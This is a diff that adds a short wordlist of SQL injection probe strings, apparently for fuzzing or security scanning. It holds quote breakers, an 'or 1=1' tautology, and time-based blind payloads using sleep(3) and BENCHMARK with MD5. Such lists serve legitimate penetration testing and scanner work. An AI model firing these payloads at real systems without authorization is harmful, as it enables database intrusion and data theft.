@@ -1,0 +1,14 @@
+"
+'
+-0
+%'aNd'1
+'lIke'
+,1
+;
+;sleep(3)#
+')
+)
+' AND 3876=BENCHMARK(10000000,MD5(0x534c6a62)) AND 'xtfN'='xtfN
+1'and(select*from(select+sleep(3))a/**/union/**/select+1)='
+"and(select*from(select+sleep(3))a/**/union/**/select+1)="
+") or 1=1#
